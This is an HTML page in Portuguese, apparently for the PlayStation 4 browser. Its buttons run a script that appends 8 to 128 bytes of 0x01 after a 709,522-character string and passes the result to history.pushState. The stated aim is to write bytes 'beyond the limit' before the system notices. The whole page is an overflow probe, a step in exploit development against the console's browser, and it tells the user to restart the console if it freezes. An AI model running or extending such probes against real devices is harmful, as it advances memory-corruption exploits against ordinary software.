<!DOCTYPE html>
<html>
<head>
    <title>PS4 Deep Tunneling</title>
    <style>
        body { background-color: #0f0f0f; color: #00ff00; font-family: monospace; padding: 20px; text-align: center; }
        button { 
            font-size: 20px; padding: 15px; margin: 10px; cursor: pointer; 
            width: 80%; border: 1px solid #00ff00; background: #222; color: #fff;
        }
        #log { margin-top: 20px; border: 1px solid #444; padding: 15px; color: cyan; }
    </style>
</head>
<body>

    <h1>Escavando o Túnel (Safe Bytes)</h1>
    <p>Vamos ver quantos bytes seguros (0x01) conseguimos escrever antes do sistema notar.</p>

    <div id="log">Reinicie o console se travar!</div>

    <button onclick="digTunnel(8)">1. TÚNEL CURTO (8 Bytes)</button>
    <button onclick="digTunnel(16)">2. TÚNEL MÉDIO (16 Bytes)</button>
    <button onclick="digTunnel(64)">3. TÚNEL LONGO (64 Bytes)</button>
    <button onclick="digTunnel(128)">4. TÚNEL PROFUNDO (128 Bytes)</button>

    <script>
        const OFFSET = 709522;

        function log(msg) {
            document.getElementById('log').innerText = msg;
        }

        function digTunnel(depth) {
            log("Escavando " + depth + " bytes além do limite...");
            
            setTimeout(() => {
                try {
                    // 1. O Buffer Seguro
                    let buffer = "A".repeat(OFFSET);
                    
                    // 2. A Extensão "Invisível"
                    // Adicionamos 'depth' vezes o byte 0x01.
                    // Se o sistema só checa se os valores são baixos, isso deve passar.
                    buffer += "\x01".repeat(depth); 

                    // Dispara
                    history.pushState({}, "tunnel_" + depth, "/" + buffer);
                    
                    log("SUCESSO! Sobreviveu a " + depth + " bytes extras.");
                    // Muda a cor para indicar progresso
                    document.body.style.backgroundColor = "#003300"; 

                } catch (e) {
                    log("Erro JS: " + e.message);
                }
            }, 500);
        }
    </script>
</body>
</html>
